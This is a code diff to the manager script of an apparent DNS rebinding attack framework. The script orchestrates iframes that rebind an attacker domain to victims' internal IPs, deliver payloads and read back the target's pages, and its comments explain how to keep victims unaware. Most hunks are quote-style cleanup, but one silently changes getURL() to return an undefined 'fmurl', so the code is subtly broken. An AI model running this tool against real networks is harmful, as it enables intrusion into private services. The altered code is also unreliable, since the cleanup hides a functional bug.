@@ -55,18 +55,18 @@ const Configuration = () => {
         init(rebindingSuccessCb) {
             // Set URL parameter `startattack` to some value 
             // to automatically start attack upon loading manager.html page
-            automatic = getParameterByName("startattack");
+            automatic = getParameterByName('startattack');
             // Set URL parameter `delaydomload` to some value 
             // to delay the browser DOM load event
             // and prevent premature exit of headless browsers
-            delayDOMLoad = getParameterByName("delaydomload");
+            delayDOMLoad = getParameterByName('delaydomload');
             // Set URL parameter `alertsuccess` to "false"
             // to not present an alert box upon a successful rebinding attack.
             // This may be useful for:
             // * not informing a victim that an attack completed
             // * or to freeze a headless browser forever (unless performing a DoS attack).
-            alertSuccess = getParameterByName("alertsuccess");
-            type = (window.location.pathname === "/manager.html") ? "manager" : "automatic";
+            alertSuccess = getParameterByName('alertsuccess');
+            type = (window.location.pathname === '/manager.html') ? 'manager' : 'automatic';
             rebindingSuccessFn = rebindingSuccessCb;
         },
         getType() {
@@ -173,14 +173,13 @@ const Configuration = () => {
             delayDOMLoad = configObject.delayDOMLoad;
             rebindingSuccessFn = configObject.rebindingSuccessFn;
 
-            if ((type === "automatic") &&
+            if ((type === 'automatic') &&
                 (hideActivity === false)) {
-                body.style.display = "block"
+                body.style.display = 'block'
             }
             if (delayDOMLoad === null) {
                 delaydomloadframe.parentNode.removeChild(delaydomloadframe);
             }
-
         }
     }
 }
@@ -199,7 +198,7 @@ const Frame = (id, url) => {
             return url = val;
         },
         getURL() {
-            return url;
+            return fmurl;
         },
         getTimer() {
             return timer;
@@ -277,22 +276,22 @@ const FrameManager = () => {
 
 // Toggles display of advanced settings.
 function toggle() {
-    if (advanced.className === "d-block") {
-        advanced.className = "d-none"
+    if (advanced.className === 'd-block') {
+        advanced.className = 'd-none'
     } else {
-        advanced.className = "d-block"
+        advanced.className = 'd-block'
     }
 }
 
 // Requests Singularity to instantiate a new HTTP server on specified port.
 function requestPort() {
     putData('/servers', {
-        "Port": document.getElementById("targetport").value
+        "Port": document.getElementById('targetport').value
     })
         .then(function (data) {
             getHTTPServersConfig().then(function (HTTPServersConfig) {
-                document.getElementById("listenports").textContent = HTTPServersConfig.ports;
-                document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
+                document.getElementById('listenports').textContent = HTTPServersConfig.ports;
+                document.getElementById('targetport').value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
             })
         })
         .catch(error => console.error(error))
@@ -367,7 +366,7 @@ const App = () => {
                 configuration.getRebindingStrategy() : forceDnsRebindingStrategyName)
             .replace("%5", configuration.getAttackHostDomain())
             .replace("%6", targetPort)
-            .replace("%7", "soopayload.html" + "?rnd=" + Math.random())
+            .replace("%7", 'soopayload.html' + '?rnd=' + Math.random())
     };
 
     return {
@@ -387,13 +386,13 @@ const App = () => {
             if (optimizeForSpeed === true) {
                 // let's try some rebinding strategy optimizations 
                 // Rebinding in 3s!
-                if (targetHostIPAddress === "0.0.0.0" && isUnixy() === true) {
+                if (targetHostIPAddress === '0.0.0.0' && isUnixy() === true) {
                     payload = 'ma';
-                    interval = "1";
+                    interval = '1';
 
-                } else if (targetHostIPAddress === "127.0.0.1" && isUnixy() === false) {
+                } else if (targetHostIPAddress === '127.0.0.1' && isUnixy() === false) {
                     payload = 'ma';
-                    interval = "1";
+                    interval = '1';
                 }
             }
 
@@ -417,16 +416,16 @@ const App = () => {
             configuration.init(rebindingSuccessCb);
 
             // Message handler between Manager and attack frames
-            window.addEventListener("message", self.receiveMessage, false);
+            window.addEventListener('message', self.receiveMessage, false);
 
-            if (configuration.getType() === "manager") {
+            if (configuration.getType() === 'manager') {
 
                 // Singularity HTTP server settings initialization
-                document.addEventListener("DOMContentLoaded", function (event) {
+                document.addEventListener('DOMContentLoaded', function (event) {
                     let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
-                        document.getElementById("listenports").textContent = HTTPServersConfig.ports;
-                        document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
-                        document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
+                        document.getElementById('listenports').textContent = HTTPServersConfig.ports;
+                        document.getElementById('targetport').value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
+                        document.getElementById('requestport').disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
                     });
 
                     // Fetch Manager configuration from Singularity HTTP server
@@ -444,11 +443,11 @@ const App = () => {
             };
         },
         addFrameToDOM(frame) {
-            let f = document.createElement("iframe");
+            let f = document.createElement('iframe');
             f.src = frame.getURL();
             f.setAttribute('id', frame.getId());
             //f.setAttribute('style', "display: none");
-            document.getElementById("attackframes").appendChild(f);
+            document.getElementById('attackframes').appendChild(f);
         },
 
         // Set src of attackframe
@@ -460,7 +459,7 @@ const App = () => {
 
         // communication handler between manager and attack iframe.
         receiveMessage(msg) {
-            console.log("Message received from: ", msg.origin, msg.data.status);
+            console.log('Message received from: ', msg.origin, msg.data.status);
 
             const fid = fm.getFrameOrigin(msg.origin)
             // If we don't have a frame ID for this message origin, dismiss message.
@@ -468,100 +467,97 @@ const App = () => {
                 return;
             };
 
-            if (msg.data.status == "start") {
+            if (msg.data.status === 'start') {
                 console.log(`Iframe reports that attack has started: ${msg.origin}`);
                 clearInterval(fm.frame(fid).getTimer());
                 msg.source.postMessage({
-                    cmd: "payload",
+                    cmd: 'payload',
                     param: configuration.getAttackPayload()
                 }, "*");
                 msg.source.postMessage({
-                    cmd: "interval",
-                    param: fm.frame(fid).getInterval() ?  fm.frame(fid).getInterval() : configuration.getInterval() 
+                    cmd: 'interval',
+                    param: fm.frame(fid).getInterval() ? fm.frame(fid).getInterval() : configuration.getInterval()
                 }, "*");
                 msg.source.postMessage({
-                    cmd: "wsproxyport",
+                    cmd: 'wsproxyport',
                     param: configuration.getWsProxyPort()
                 }, "*");
                 msg.source.postMessage({
-                    cmd: "indextoken",
+                    cmd: 'indextoken',
                     param: configuration.getIndexToken()
                 }, "*");
                 msg.source.postMessage({
-                    cmd: "flushdns",
+                    cmd: 'flushdns',
                     param: { hostname: window.location.hostname, flushDns: configuration.getFlushDns() }
                 }, "*");
                 configuration.setFlushDns(false); // so it run only once in autoattack.
                 msg.source.postMessage({
-                    cmd: "start",
+                    cmd: 'start',
                     param: null
                 }, "*");
             }
-            if (msg.data.status == "success") {
+            if (msg.data.status === 'success') {
                 configuration.getRebindingSuccessFn()(msg);
                 msg.source.postMessage({
-                    cmd: "stop"
+                    cmd: 'stop'
                 }, "*");
             };
 
-            if (msg.data.status === "requiresHttpAuthentication") {
+            if (msg.data.status === 'requiresHttpAuthentication') {
                 document.getElementById(fid).contentWindow.postMessage({
-                    cmd: "stop"
+                    cmd: 'stop'
                 }, "*");
                 console.log(`This resource requires HTTP authentication. Cannot access without user noticing: ${msg.origin}`);
             }
 
             // Possibly a firewalled or closed port. Possibly a non-HTTP service.
-            if (msg.data.status === "error") {
+            if (msg.data.status === 'error') {
                 fm.frame(fid).incrementErrorCount();
                 console.log(`error: ${msg.origin}`);
 
-                if (fm.frame(fid).getErrorCount() == 5) {
+                if (fm.frame(fid).getErrorCount() === 5) {
                     document.getElementById(fid).contentWindow.postMessage({
-                        cmd: "stop"
+                        cmd: 'stop'
                     }, "*");
                     console.log(`Too many errors, stopping: ${msg.origin}`);
                 }
             }
-
         },
         // Starts attack
         begin() {
             let self = this;
 
-            const UiInterval = document.getElementById("interval").value;
+            const UiInterval = document.getElementById('interval').value;
             configuration.setInterval(UiInterval);
 
-            const UiFlushDns = document.getElementById("flushdns").checked;
+            const UiFlushDns = document.getElementById('flushdns').checked;
             configuration.setFlushDns(UiFlushDns);
 
-            const UiAttackPayloadName = document.getElementById("payloads").value;
+            const UiAttackPayloadName = document.getElementById('payloads').value;
             configuration.setAttackPayload(UiAttackPayloadName);
 
-            const UiAttackWsProxyPort = document.getElementById("wsproxyport").value;
+            const UiAttackWsProxyPort = document.getElementById('wsproxyport').value;
             configuration.setWsProxyPort(UiAttackWsProxyPort);
 
 
             let fid = fm.addFrame(hosturl
-                .replace("%1", document.getElementById("attackhostipaddress").value)
-                .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
+                .replace("%1", document.getElementById('attackhostipaddress').value)
+                .replace("%2", document.getElementById('targethostipaddress').value.replace(/-/g, '--'))
                 .replace("%3", Math.floor(Math.random() * 2 ** 32))
-                .replace("%4", document.getElementById("rebindingStrategy").value)
-                .replace("%5", document.getElementById("attackhostdomain").value)
-                .replace("%6", document.getElementById("targetport").value)
+                .replace("%4", document.getElementById('rebindingStrategy').value)
+                .replace("%5", document.getElementById('attackhostdomain').value)
+                .replace("%6", document.getElementById('targetport').value)
                 //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
-                .replace("%7", "soopayload.html") + "?rnd=" + Math.random());
+                .replace("%7", 'soopayload.html') + '?rnd=' + Math.random());
 
             self.addFrameToDOM(fm.frame(fid));
 
-            message.className = "d-block";
+            message.className = 'd-block';
             start.disabled = true;
 
             fm.frame(fid).setTimer(setInterval((() => {
                 self.reloadAttackFrame(fm.frame(fid))
             }), parseInt(UiInterval) * 1000));
-
-            //self.reloadAttackFrame(fm.frame(fid));
         }
     }
 }
@@ -572,14 +568,13 @@ function isUnixy() {
 
 function rebindingSuccessCb(msg) {
     console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
-    if ((app.getConfiguration().getAlertSuccess() !== "false") &&
-        (app.getConfiguration().getType() === "manager") &&
-        (document.getElementById("payloads").value !== "Hook and Control")) {
-        alert("Attack Successful from " + document.domain + ".\n"
-            + "Origin: \n" + msg.origin + ".\n"
-            + "Target home page contents:\n" + msg.data.response);
+    if ((app.getConfiguration().getAlertSuccess() !== 'false') &&
+        (app.getConfiguration().getType() === 'manager') &&
+        (document.getElementById('payloads').value !== 'Hook and Control')) {
+        alert('Attack Successful from ' + document.domain + '.\n'
+            + 'Origin: \n' + msg.origin + '.\n'
+            + 'Target home page contents:\n' + msg.data.response);
     }
-
 }
 
 // Start
